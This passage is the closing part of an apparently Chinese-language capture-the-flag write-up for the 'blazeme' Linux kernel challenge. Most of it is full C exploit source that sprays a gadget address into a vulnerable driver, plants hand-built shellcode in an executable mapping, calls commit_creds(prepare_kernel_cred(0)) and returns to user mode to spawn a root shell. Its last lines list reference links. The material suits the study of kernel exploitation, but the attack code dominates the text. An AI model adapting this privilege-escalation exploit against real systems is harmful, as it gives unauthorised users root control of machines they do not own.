<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;try to read..........&quot;</span><span class="op">);</span></span>
<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> ret <span class="op">=</span> read<span class="op">(</span>fd<span class="op">,</span>buf<span class="op">,</span><span class="dv">64</span><span class="op">);</span></span>
<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb24-20"><a href="#cb24-20" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> cnt <span class="op">=</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)(</span>sz<span class="op">/</span><span class="dv">8</span><span class="op">);</span></span>
<span id="cb24-21"><a href="#cb24-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span>i<span class="op">=</span><span class="dv">0</span><span class="op">;</span>i<span class="op">&lt;</span>cnt<span class="op">;</span>i<span class="op">++)</span></span>
<span id="cb24-22"><a href="#cb24-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb24-23"><a href="#cb24-23" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint64_t</span> t <span class="op">=</span> <span class="op">*((</span><span class="dt">uint64_t</span><span class="op">*)&amp;</span>buf<span class="op">[</span>i<span class="op">*</span><span class="dv">8</span><span class="op">]);</span></span>
<span id="cb24-24"><a href="#cb24-24" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>cnt<span class="op">%</span><span class="dv">8</span><span class="op">==</span><span class="dv">0</span><span class="op">)</span></span>
<span id="cb24-25"><a href="#cb24-25" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
<span id="cb24-26"><a href="#cb24-26" aria-hidden="true" tabindex="-1"></a>            puts<span class="op">(</span><span class="st">&quot;&quot;</span><span class="op">);</span></span>
<span id="cb24-27"><a href="#cb24-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb24-28"><a href="#cb24-28" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;%p</span><span class="sc">\n</span><span class="st"> &quot;</span><span class="op">,</span>t<span class="op">);</span></span>
<span id="cb24-29"><a href="#cb24-29" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb24-30"><a href="#cb24-30" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">read:%s</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>buf<span class="op">);</span></span>
<span id="cb24-31"><a href="#cb24-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-32"><a href="#cb24-32" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
<span id="cb24-33"><a href="#cb24-33" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb24-34"><a href="#cb24-34" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> blazeme_write<span class="op">(</span><span class="dt">int</span> fd<span class="op">,</span><span class="dt">char</span> <span class="op">*</span>buf<span class="op">,</span><span class="dt">size_t</span> sz<span class="op">)</span></span>
<span id="cb24-35"><a href="#cb24-35" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb24-36"><a href="#cb24-36" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;try to write..........&quot;</span><span class="op">);</span></span>
<span id="cb24-37"><a href="#cb24-37" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> n <span class="op">=</span> write<span class="op">(</span>fd<span class="op">,</span>buf<span class="op">,</span><span class="dv">64</span><span class="op">);</span></span>
<span id="cb24-38"><a href="#cb24-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> n<span class="op">;</span></span>
<span id="cb24-39"><a href="#cb24-39" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb24-40"><a href="#cb24-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-41"><a href="#cb24-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-42"><a href="#cb24-42" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> get_shell<span class="op">()</span></span>
<span id="cb24-43"><a href="#cb24-43" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb24-44"><a href="#cb24-44" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/bin/sh&quot;</span><span class="op">);</span></span>
<span id="cb24-45"><a href="#cb24-45" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb24-46"><a href="#cb24-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-47"><a href="#cb24-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-48"><a href="#cb24-48" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> trap_frame<span class="op">{</span></span>
<span id="cb24-49"><a href="#cb24-49" aria-hidden="true" tabindex="-1"></a>        <span class="dt">void</span> <span class="op">*</span>rip<span class="op">;</span></span>
<span id="cb24-50"><a href="#cb24-50" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint64_t</span> cs<span class="op">;</span></span>
<span id="cb24-51"><a href="#cb24-51" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint64_t</span> rflags<span class="op">;</span></span>
<span id="cb24-52"><a href="#cb24-52" aria-hidden="true" tabindex="-1"></a>        <span class="dt">void</span> <span class="op">*</span>rsp<span class="op">;</span></span>
<span id="cb24-53"><a href="#cb24-53" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint64_t</span> ss<span class="op">;</span></span>
<span id="cb24-54"><a href="#cb24-54" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb24-55"><a href="#cb24-55" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> trap_frame tf<span class="op">;</span></span>
<span id="cb24-56"><a href="#cb24-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-57"><a href="#cb24-57" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> prepare_tf<span class="op">(){</span></span>
<span id="cb24-58"><a href="#cb24-58" aria-hidden="true" tabindex="-1"></a>        asm<span class="op">(</span>    <span class="st">&quot;movq %%cs, %0</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-59"><a href="#cb24-59" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;movq %%ss, %1</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-60"><a href="#cb24-60" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;movq %%rsp, %3</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-61"><a href="#cb24-61" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;pushfq</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-62"><a href="#cb24-62" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;popq %2</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-63"><a href="#cb24-63" aria-hidden="true" tabindex="-1"></a>                <span class="op">:</span> <span class="st">&quot;=r&quot;</span><span class="op">(</span>tf<span class="op">.</span>cs<span class="op">),</span> <span class="st">&quot;=r&quot;</span><span class="op">(</span>tf<span class="op">.</span>ss<span class="op">),</span> <span class="st">&quot;=r&quot;</span><span class="op">(</span>tf<span class="op">.</span>rflags<span class="op">),</span> <span class="st">&quot;=r&quot;</span><span class="op">(</span>tf<span class="op">.</span>rsp<span class="op">)</span> <span class="op">::</span> <span class="st">&quot;memory&quot;</span></span>
<span id="cb24-64"><a href="#cb24-64" aria-hidden="true" tabindex="-1"></a>        <span class="op">);</span></span>
<span id="cb24-65"><a href="#cb24-65" aria-hidden="true" tabindex="-1"></a>        tf<span class="op">.</span>rip <span class="op">=</span> <span class="op">&amp;</span>get_shell<span class="op">;</span></span>
<span id="cb24-66"><a href="#cb24-66" aria-hidden="true" tabindex="-1"></a>        tf<span class="op">.</span>rsp <span class="op">-=</span> <span class="dv">1024</span><span class="op">;</span></span>
<span id="cb24-67"><a href="#cb24-67" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb24-68"><a href="#cb24-68" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-69"><a href="#cb24-69" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> get_root<span class="op">()</span></span>
<span id="cb24-70"><a href="#cb24-70" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb24-71"><a href="#cb24-71" aria-hidden="true" tabindex="-1"></a>    commit_creds<span class="op">(</span>prepare_kernel_cred<span class="op">(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb24-72"><a href="#cb24-72" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span>    <span class="st">&quot;swapgs</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-73"><a href="#cb24-73" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;mov $tf,%rsp</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-74"><a href="#cb24-74" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;iretq</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb24-75"><a href="#cb24-75" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
<span id="cb24-76"><a href="#cb24-76" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb24-77"><a href="#cb24-77" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-78"><a href="#cb24-78" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-79"><a href="#cb24-79" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-80"><a href="#cb24-80" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-81"><a href="#cb24-81" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-82"><a href="#cb24-82" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-83"><a href="#cb24-83" aria-hidden="true" tabindex="-1"></a><span class="co">//it not works, i don&#39;t know why</span></span>
<span id="cb24-84"><a href="#cb24-84" aria-hidden="true" tabindex="-1"></a><span class="co">//gadget:0xffffffff81acdac1 : push 0x25685f77 ; ret</span></span>
<span id="cb24-85"><a href="#cb24-85" aria-hidden="true" tabindex="-1"></a><span class="co">//uint64_t spray_ret_addr = 0xffffffff81acdac1;</span></span>
<span id="cb24-86"><a href="#cb24-86" aria-hidden="true" tabindex="-1"></a><span class="co">//uint64_t start_addr = 0x25685f77;</span></span>
<span id="cb24-87"><a href="#cb24-87" aria-hidden="true" tabindex="-1"></a><span class="co">//this one will rise bug:NX excute problem, I don&#39;t know why</span></span>
<span id="cb24-88"><a href="#cb24-88" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-89"><a href="#cb24-89" aria-hidden="true" tabindex="-1"></a><span class="co">//0xffffffff814b4524 : push 0x5dffc515 ; ret</span></span>
<span id="cb24-90"><a href="#cb24-90" aria-hidden="true" tabindex="-1"></a><span class="dt">uint64_t</span> spray_ret_addr <span class="op">=</span> <span class="bn">0xffffffff814b4524</span><span class="op">;</span></span>
<span id="cb24-91"><a href="#cb24-91" aria-hidden="true" tabindex="-1"></a><span class="dt">uint64_t</span> start_addr <span class="op">=</span> <span class="bn">0x5dffc515</span><span class="op">;</span></span>
<span id="cb24-92"><a href="#cb24-92" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-93"><a href="#cb24-93" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> mmaping_shellcode_area<span class="op">()</span></span>
<span id="cb24-94"><a href="#cb24-94" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb24-95"><a href="#cb24-95" aria-hidden="true" tabindex="-1"></a>    <span class="dt">void</span> <span class="op">*</span> p <span class="op">=</span> mmap<span class="op">(</span>start_addr<span class="op">,</span><span class="dv">4096</span><span class="op">,</span>PROT_READ <span class="op">|</span> PROT_WRITE <span class="op">|</span> PROT_EXEC<span class="op">,</span>MAP_ANONYMOUS <span class="op">|</span> MAP_PRIVATE<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
<span id="cb24-96"><a href="#cb24-96" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;get mmap point:%p</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p<span class="op">);</span></span>
<span id="cb24-97"><a href="#cb24-97" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>p<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="bn">0x1000</span><span class="op">);</span></span>
<span id="cb24-98"><a href="#cb24-98" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-99"><a href="#cb24-99" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>code <span class="op">=</span> <span class="op">(</span><span class="dt">char</span><span class="op">*)</span>start_addr<span class="op">;</span></span>
<span id="cb24-100"><a href="#cb24-100" aria-hidden="true" tabindex="-1"></a>    <span class="co">//char *get_root_code = (char*)&amp;get_root+4;</span></span>
<span id="cb24-101"><a href="#cb24-101" aria-hidden="true" tabindex="-1"></a>    <span class="co">//memcpy(code,get_root_code,49);</span></span>
<span id="cb24-102"><a href="#cb24-102" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-103"><a href="#cb24-103" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> low <span class="op">=</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span><span class="op">)&amp;</span>get_root <span class="op">&amp;</span> <span class="bn">0xffffffff</span><span class="op">;</span></span>
<span id="cb24-104"><a href="#cb24-104" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> high <span class="op">=</span> <span class="op">((</span><span class="dt">unsigned</span> <span class="dt">long</span><span class="op">)&amp;</span>get_root <span class="op">&gt;&gt;</span> <span class="dv">32</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xffffffff</span><span class="op">;</span></span>
<span id="cb24-105"><a href="#cb24-105" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-106"><a href="#cb24-106" aria-hidden="true" tabindex="-1"></a>    <span class="co">/*</span></span>
<span id="cb24-107"><a href="#cb24-107" aria-hidden="true" tabindex="-1"></a><span class="co">     *  orignal:</span></span>
<span id="cb24-108"><a href="#cb24-108" aria-hidden="true" tabindex="-1"></a><span class="co">     *  0x5dffc515    mov    dword ptr [rsp], 0x401ea6</span></span>
<span id="cb24-109"><a href="#cb24-109" aria-hidden="true" tabindex="-1"></a><span class="co">     *  0x5dffc51c    mov    dword ptr [rsp + 4], 0</span></span>
<span id="cb24-110"><a href="#cb24-110" aria-hidden="true" tabindex="-1"></a><span class="co">     *  0x5dffc524    ret  </span></span>
<span id="cb24-111"><a href="#cb24-111" aria-hidden="true" tabindex="-1"></a><span class="co">     */</span></span>
<span id="cb24-112"><a href="#cb24-112" aria-hidden="true" tabindex="-1"></a>    <span class="co">/*</span></span>
<span id="cb24-113"><a href="#cb24-113" aria-hidden="true" tabindex="-1"></a><span class="co">    ash@ash-VirtualBox:~$ rasm2 -a  x86 -b 64 &quot;mov [rsp+4],0&quot;</span></span>
<span id="cb24-114"><a href="#cb24-114" aria-hidden="true" tabindex="-1"></a><span class="co">    48c744240400000000</span></span>
<span id="cb24-115"><a href="#cb24-115" aria-hidden="true" tabindex="-1"></a><span class="co">    ash@ash-VirtualBox:~$ rasm2 -a  x86 -b 64 &quot;mov [rsp],0&quot;</span></span>
<span id="cb24-116"><a href="#cb24-116" aria-hidden="true" tabindex="-1"></a><span class="co">    48c7042400000000</span></span>
<span id="cb24-117"><a href="#cb24-117" aria-hidden="true" tabindex="-1"></a><span class="co">    */</span></span>
<span id="cb24-118"><a href="#cb24-118" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb24-119"><a href="#cb24-119" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x48</span><span class="op">;</span></span>
<span id="cb24-120"><a href="#cb24-120" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-121"><a href="#cb24-121" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0xc7</span><span class="op">;</span></span>
<span id="cb24-122"><a href="#cb24-122" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x04</span><span class="op">;</span></span>
<span id="cb24-123"><a href="#cb24-123" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x24</span><span class="op">;</span></span>
<span id="cb24-124"><a href="#cb24-124" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-125"><a href="#cb24-125" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low<span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-126"><a href="#cb24-126" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low <span class="op">&gt;&gt;</span> <span class="dv">8</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-127"><a href="#cb24-127" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low <span class="op">&gt;&gt;</span> <span class="dv">16</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-128"><a href="#cb24-128" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low <span class="op">&gt;&gt;</span> <span class="dv">24</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-129"><a href="#cb24-129" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-130"><a href="#cb24-130" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-131"><a href="#cb24-131" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x48</span><span class="op">;</span></span>
<span id="cb24-132"><a href="#cb24-132" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0xc7</span><span class="op">;</span></span>
<span id="cb24-133"><a href="#cb24-133" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x44</span><span class="op">;</span></span>
<span id="cb24-134"><a href="#cb24-134" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x24</span><span class="op">;</span></span>
<span id="cb24-135"><a href="#cb24-135" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x04</span><span class="op">;</span></span>
<span id="cb24-136"><a href="#cb24-136" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-137"><a href="#cb24-137" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high<span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-138"><a href="#cb24-138" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high <span class="op">&gt;&gt;</span> <span class="dv">8</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-139"><a href="#cb24-139" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high <span class="op">&gt;&gt;</span> <span class="dv">16</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-140"><a href="#cb24-140" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high <span class="op">&gt;&gt;</span> <span class="dv">24</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb24-141"><a href="#cb24-141" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-142"><a href="#cb24-142" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0xc3</span><span class="op">;</span></span>
<span id="cb24-143"><a href="#cb24-143" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb24-144"><a href="#cb24-144" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-145"><a href="#cb24-145" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span> argv<span class="op">)</span></span>
<span id="cb24-146"><a href="#cb24-146" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb24-147"><a href="#cb24-147" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> cnt <span class="op">=</span> <span class="dv">1000</span><span class="op">;</span></span>
<span id="cb24-148"><a href="#cb24-148" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb24-149"><a href="#cb24-149" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-150"><a href="#cb24-150" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>argc<span class="op">&gt;=</span><span class="dv">2</span><span class="op">)</span></span>
<span id="cb24-151"><a href="#cb24-151" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb24-152"><a href="#cb24-152" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;arg:%s</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
<span id="cb24-153"><a href="#cb24-153" aria-hidden="true" tabindex="-1"></a>        cnt <span class="op">=</span> atoi<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
<span id="cb24-154"><a href="#cb24-154" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb24-155"><a href="#cb24-155" aria-hidden="true" tabindex="-1"></a>    fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/dev/blazeme&quot;</span><span class="op">,</span>O_RDWR<span class="op">);</span></span>
<span id="cb24-156"><a href="#cb24-156" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span><span class="op">(</span>fd<span class="op">&lt;</span><span class="dv">0</span><span class="op">)</span></span>
<span id="cb24-157"><a href="#cb24-157" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb24-158"><a href="#cb24-158" aria-hidden="true" tabindex="-1"></a>        puts<span class="op">(</span><span class="st">&quot;open file fail&quot;</span><span class="op">);</span></span>
<span id="cb24-159"><a href="#cb24-159" aria-hidden="true" tabindex="-1"></a>        exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
<span id="cb24-160"><a href="#cb24-160" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb24-161"><a href="#cb24-161" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-162"><a href="#cb24-162" aria-hidden="true" tabindex="-1"></a>    prepare_tf<span class="op">();</span></span>
<span id="cb24-163"><a href="#cb24-163" aria-hidden="true" tabindex="-1"></a>    mmaping_shellcode_area<span class="op">();</span></span>
<span id="cb24-164"><a href="#cb24-164" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-165"><a href="#cb24-165" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> in_buf<span class="op">[</span><span class="dv">64</span><span class="op">]</span> <span class="op">={</span><span class="dv">0</span><span class="op">};</span></span>
<span id="cb24-166"><a href="#cb24-166" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-167"><a href="#cb24-167" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint64_t</span> out_msg<span class="op">[</span><span class="dv">8</span><span class="op">*</span><span class="dv">3</span><span class="op">];</span></span>
<span id="cb24-168"><a href="#cb24-168" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint64_t</span> msg2<span class="op">[</span><span class="dv">8</span><span class="op">];</span></span>
<span id="cb24-169"><a href="#cb24-169" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-170"><a href="#cb24-170" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>out_msg<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>out_msg<span class="op">));</span></span>
<span id="cb24-171"><a href="#cb24-171" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>msg2<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>msg2<span class="op">));</span></span>
<span id="cb24-172"><a href="#cb24-172" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb24-173"><a href="#cb24-173" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span>i<span class="op">=</span><span class="dv">0</span><span class="op">;</span>i<span class="op">&lt;</span><span class="dv">8</span><span class="op">;</span>i<span class="op">++)</span></span>
<span id="cb24-174"><a href="#cb24-174" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb24-175"><a href="#cb24-175" aria-hidden="true" tabindex="-1"></a>        msg2<span class="op">[</span>i<span class="op">]</span> <span class="op">=</span> spray_ret_addr<span class="op">;</span></span>
<span id="cb24-176"><a href="#cb24-176" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb24-177"><a href="#cb24-177" aria-hidden="true" tabindex="-1"></a>    memcpy<span class="op">(</span>in_buf<span class="op">,</span><span class="st">&quot;AA&quot;</span><span class="op">,</span><span class="dv">2</span><span class="op">);</span></span>
<span id="cb24-178"><a href="#cb24-178" aria-hidden="true" tabindex="-1"></a>    memcpy<span class="op">(&amp;</span>in_buf<span class="op">[</span><span class="dv">2</span><span class="op">],</span>msg2<span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>in_buf<span class="op">)-</span><span class="dv">2</span><span class="op">);</span></span>
<span id="cb24-179"><a href="#cb24-179" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb24-180"><a href="#cb24-180" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span>i<span class="op">=</span><span class="dv">0</span><span class="op">;</span>i<span class="op">&lt;</span>cnt<span class="op">;</span>i<span class="op">++)</span></span>
<span id="cb24-181"><a href="#cb24-181" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb24-182"><a href="#cb24-182" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;-------------------%d-----------------------</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>i<span class="op">);</span></span>
<span id="cb24-183"><a href="#cb24-183" aria-hidden="true" tabindex="-1"></a>        blazeme_write<span class="op">(</span>fd<span class="op">,</span>in_buf<span class="op">,</span><span class="dv">64</span><span class="op">);</span></span>
<span id="cb24-184"><a href="#cb24-184" aria-hidden="true" tabindex="-1"></a>        <span class="co">//blazeme_read(fd,out_msg,sizeof(out_msg));</span></span>
<span id="cb24-185"><a href="#cb24-185" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb24-186"><a href="#cb24-186" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-187"><a href="#cb24-187" aria-hidden="true" tabindex="-1"></a>    close<span class="op">(</span>fd<span class="op">);</span></span>
<span id="cb24-188"><a href="#cb24-188" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h2 id="anx">Anx:</h2>
<p><strong>一些有用的完整</strong>:</p>
<p>1、负数补码和反码online：https://www.23bei.com/tool/56.html?</p>
<p>2、kernel pwn base:<a
href="https://mem2019.github.io/jekyll/update/2019/01/11/Linux-Kernel-Pwn-Basics.html">Linux
Kernel Pwn Basics</a></p>
<p>3、本次题目的writeup参考：https://akulpillai.com/posts/learning_through_challenges1/</p>
</body>
</html>
